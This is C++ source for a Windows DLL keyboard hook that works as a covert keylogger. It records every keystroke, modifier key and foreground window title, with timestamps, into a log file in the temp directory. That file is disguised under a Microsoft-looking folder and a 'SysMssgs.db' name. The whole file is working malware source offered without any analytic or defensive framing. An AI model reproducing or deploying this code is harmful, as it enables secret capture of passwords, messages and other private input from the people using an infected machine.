#include "SysMssgsLib.h"

ofstream log;

//============================================================================================
//This function is called by the application installed hook in order to handle keyboard events
extern "C" __declspec (dllexport) LRESULT __stdcall KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
       char logfile[512], timebuffer[50];
       time_t rawtime;
       string buffer;
       struct tm * timeinfo;
       struct HEADER head;
       bool dirty = false;
       FILE * headp;
       
       //open log file
       GetTempPath(512, logfile);
       strcat(logfile, "Microsoft_9021784367548932\\Temp\\SysMssgs.db");
       log.open(logfile, fstream::out | fstream::app);
       if (!log) return 1;
       headp = fopen(logfile,"r+b");
       
       //check for keyboard action
       if  (code == HC_ACTION)
       {

           //key pressed
           if  (!(lParam & 0x80000000))
           {
               fread(&head, sizeof(head), 1, headp);
               fflush(headp);
               HWND hand = GetForegroundWindow();
               int len = GetWindowTextLength(hand);
               char* title = new char[len+1];
               GetWindowText(hand, title, len+1);
               
               if (strcmp(head.title, title) != 0)
               {
                                      time(&rawtime); timeinfo = localtime(&rawtime); strftime(timebuffer, 50, "(%H:%M) ", timeinfo);
                                      log << endl << endl << endl << " :";
                                      for (int i = 1 ; i <= len+10 ; i ++) log << "=";
                                      log << ":" <<endl << " | " << title << " " << timebuffer << "|" << endl << " :";
                                      for (int i = 1 ; i <= len+10 ; i ++) log << "=";
                                      log << ":" << endl << endl;
                                      head.addi = true;
                                      head.addl = false;
                                      strcpy(head.title, title);
                                      dirty = true;
               }
               delete[] title;
               
               if (head.addi == true)
               {
                             head.addi = false;
                             if (head.addl == true) log << endl << endl;
                             log << "  #" << head.index++ << ")";
                             time(&rawtime); timeinfo = localtime(&rawtime); strftime(timebuffer, 50, "(%H:%M):  ", timeinfo);
                             log << timebuffer;
                             dirty = true;
               }
               
               //numbers
               if ((wParam >= 48) && (wParam <= 57)) log << (char)wParam;
               
               //letters
               else if ((wParam >= 65) && (wParam <= 90)) log << (char)(wParam+32);
               
               //function keys
               else if ((wParam >= 112) && (wParam <= 123))
               {
                    if ((wParam >= 121) && (wParam <= 123)) log << "[F1" << (char)(wParam-73) << "]";
                    else log << "[F" << (char)(wParam-63) << "]";
               }
               
               //numpad numbers
               else if ((wParam >= 96) && (wParam <= 105)) log << "[Num " << (char)(wParam-48) << "]";
               else
               {
                   switch(wParam)
                   {
                          case VK_SPACE: log << " ";           break;
                          case VK_BACK: log << "[BCK]";        break;
                          case VK_TAB: log << "[Tab]";         break;
                          case VK_DELETE: log << "[DEL]";      break;
                          case VK_CAPITAL: log << "[CAPS]";    break;
                          case VK_ESCAPE: log << "[ESQ]";      break;
                          case VK_LEFT: log << "[<-]";          break;
                          case VK_RIGHT: log << "[->]";         break;
                          case VK_UP: log << "[Ë]";           break;
                          case VK_DOWN: log << "[V]";         break;
                          case 187: log << "[+=]";             break;
                          case 189: log << "[-_]";             break;
                          case 188: log << ",";                break;
                          case 190: log << ".";                break;
                          case VK_OEM_1: log << "[;:]";        break;
                          case VK_OEM_2: log << "[/?]";        break;
                          case VK_OEM_3: log << "[`~]";        break;
                          case VK_OEM_4: log << "[[{]";        break;
                          case VK_OEM_5: log << "[\\|]";       break;
                          case VK_OEM_6: log << "[]}]";        break;
                          case VK_OEM_7: log << "['\"]";       break;
                          case VK_MULTIPLY: log << "[Num *]";  break;
                          case VK_ADD: log << "[Num +]";       break;
                          case 109: log << "[Num -]";          break;
                          case VK_DIVIDE: log << "[Num \\]";   break;
                          case VK_PRIOR: log << "[PgUp]";      break;
                          case VK_NEXT: log << "[PgDn]";       break;
                          case VK_END: log << "[END]";         break;
                          case VK_HOME: log << "[HOME]";       break;
                          case VK_SNAPSHOT: log << "[PrScr]";  break;
                          case VK_NUMLOCK: log << "[NumLck]";  break;
                          case VK_INSERT: log << "[Insrt]";    break;
                          case VK_MENU: if (!(lParam & 0x40000000)) log << "[+ALT+]"; break;
                          case VK_SHIFT: if (!(lParam & 0x40000000)) log << "[+SHFT+]"; break;
                          case VK_LWIN: if (!(lParam & 0x40000000)) log << "[+Win+]"; break;
                          case VK_CONTROL: if (!(lParam & 0x40000000)) log << "[+CTRL+]"; break;
                          case VK_RETURN: log << "[ENTR]"; head.addi = true; head.addl = true; dirty = true; break;
                   }
               }
           }
           
           //key released
           else if (lParam & 0x80000000)
           {
                if (wParam == VK_SHIFT) log << "[-SHFT-]";
                else if (wParam == VK_MENU) log << "[-ALT-]";
                else if (wParam == VK_CONTROL) log << "[-CTRL-]";
                else if (wParam == VK_LWIN) log << "[-Win-]";
           }
       }
       
       //update header
       if (dirty)
       {
                 fseek(headp, 0, SEEK_SET);
                 fwrite(&head, sizeof(head), 1, headp);
       }
       
       //close log and pass the event
       log.close();
       fclose(headp);
       return CallNextHookEx(0, code, wParam, lParam);
}

//===============================================================================

extern "C" BOOL __declspec (dllexport) __stdcall DllMain (HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    return TRUE;
}
